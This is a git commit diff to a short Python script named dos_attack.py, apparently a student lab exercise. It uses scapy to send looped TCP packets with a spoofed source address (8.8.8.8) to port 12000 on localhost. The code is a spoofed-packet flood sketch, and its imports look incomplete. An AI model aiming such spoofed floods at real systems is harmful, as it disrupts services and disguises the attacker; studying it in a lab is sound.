aca608b6dbc5aaa57edc7c4576bb861cef71702d
Jost Luebbe <jostluebbe@utexas.edu>
2019-09-09 15:36:33 -0500

    updated dos script?

--- dos_attack.py
+++ dos_attack.py
@@ -1,6 +1,13 @@
 from scapy.all import IP, TCP, sr
 
-packet = IP(dst='127.0.0.1', src='8.8.8.8')/TCP(dport=12000)
+packet = IP(dst='127.0.0.1', src='8.8.8.8', id=1111, ttl=99)/TCP(sport=RandShort(), dport=12000, seq=12345, ack=100)
+ls(packet)
+
+ans, unans = srloop(packet, inter=0.3, retry=2, timeout=4)
+
+ans.summary()
+
+unans.summary()
 
 rsv = sr(packet)
 
